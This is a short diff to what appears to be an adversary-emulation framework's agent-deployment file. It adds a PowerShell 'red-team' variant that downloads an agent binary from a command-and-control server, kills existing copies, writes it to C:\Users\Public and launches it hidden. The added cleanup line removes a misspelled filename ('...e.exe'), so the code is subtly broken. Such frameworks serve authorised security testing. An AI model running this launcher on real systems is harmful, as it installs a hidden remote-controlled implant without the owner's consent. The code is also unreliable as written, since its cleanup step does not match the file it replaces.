@@ -94,6 +94,19 @@
               rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea ignore;
               [io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data) | Out-Null;
               Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-server $server -group blue" -WindowStyle hidden;
+          - description: Compile red-team agent with a comma-separated list of extensions (requires GoLang).
+            command: |
+              $server="#{app.contact.http}";
+              $url="$server/file/download";
+              $wc=New-Object System.Net.WebClient;
+              $wc.Headers.add("platform","windows");
+              $wc.Headers.add("file","sandcat.go");
+              $wc.Headers.add("gocat-extensions", "#{agent.extensions}");
+              $data=$wc.DownloadData($url);
+              get-process | ? {$_.modules.filename -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f;
+              rm -force "C:\Users\Public\#{agents.implant_name}e.exe" -ea ignore;
+              [io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data) | Out-Null;
+              Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
           - description: Deploy as a P2P agent with known peers included in compiled agent
             command: |
               $server="#{app.contact.http}";
